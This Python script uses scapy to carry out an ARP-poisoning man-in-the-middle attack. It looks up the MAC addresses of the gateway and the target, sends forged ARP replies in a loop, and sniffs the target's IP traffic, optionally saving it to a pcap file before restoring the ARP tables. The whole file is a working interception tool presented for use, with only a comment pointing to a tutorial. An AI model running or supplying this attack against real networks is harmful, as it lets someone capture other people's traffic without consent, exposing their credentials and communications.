from scapy.all import *
import sys, threading, argparse


def parse_args(argv):
    args = argparse.ArgumentParser()
    args.add_argument('-g', '-gateway', dest='gateway', help='Gateway address')
    args.add_argument('-t', '-target', dest='target', help='Target address')
    args.add_argument('-i', '-interface', dest='interface', help='The interface to send the packets from', default=get_working_if())
    args.add_argument('-p', '-packets', dest='packets', help='Packet count', default=1000)
    args.add_argument('-o', '-output', dest='output', help='Output location')
    return args.parse_args(argv)

# https://medium.com/@777rip777/arp-spoofer-with-python-and-scapy-b848d7bc15b3
def get_mac(ip):
    # Create arp packet object. pdst - destination host ip address
    arp_request = ARP(pdst=ip)
    # Create ether packet object. dst - broadcast mac address.
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    # Combine two packets in two one
    arp_request_broadcast = broadcast/arp_request
    # Get list with answered hosts
    answered_list = srp(arp_request_broadcast, timeout=1,
                              verbose=False)[0]
    if len(answered_list) == 0:
        return None
    # Return host mac address
    return answered_list[0][1].hwsrc

def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
    print('[*] Restoring target')
    sendp(Ether()/ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst='ff:ff:ff:ff:ff:ff', hwsrc=gateway_mac), count=5)
    sendp(Ether()/ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst='ff:ff:ff:ff:ff:ff', hwsrc=target_mac), count=5)


class Poisoner:
    done = False
    def poison_target(self, gateway_ip, gateway_mac, target_ip, target_mac):
        pt = Ether()/ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac)

        pg = Ether()/ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst=gateway_mac)

        print('[*] Poisoning {}. Press Ctrl-C to stop'.format(target_ip))

        while not self.done:
            try:
                sendp(pt)

                sendp(pg)

                time.sleep(2)
            except:
                self.done = True
                print('Encountered an error trying to send poison packets')
        print('[*] ARP poison attack finished')

args = parse_args(sys.argv[1:])
if (args.gateway is None or args.target is None):
    print('Gateway and target are both required inputs')
    sys.exit(1)

conf.iface = args.interface
conf.verb = 0

print('[*] Setting up {}'.format(args.interface))
gateway_mac = get_mac(args.gateway)

if gateway_mac is None:
    print('[!!] Unable to get gateway MAC. Exiting')
    sys.exit(1)
else:
    print('[*] Gateway {} is at {}'.format(args.gateway, gateway_mac))

target_mac = get_mac(args.target)
if target_mac is None:
    print('[!!!] Unable to get target MAC. Exiting')
    sys.exit(1)
else:
    print('[*] Target {} is at {}'.format(args.target, target_mac))

poisoner = Poisoner()
poison_thread = threading.Thread(target=poisoner.poison_target, args=((args.gateway), gateway_mac, (args.target), target_mac))
poison_thread.start()
try:
    print('[*] Sniffing {} packets'.format(args.packets))
    bpf_filter = 'ip host {}'.format(args.target)
    packets = sniff(count=(args.packets), filter=bpf_filter, iface=(args.interface))
    if args.output:
        wrpcap(args.output, packets)
except:
    # hack to get around keyboard interrupts
    pass
poisoner.done = True
poison_thread.join()
restore_target(args.gateway, gateway_mac, args.target, target_mac)
sys.exit(0)
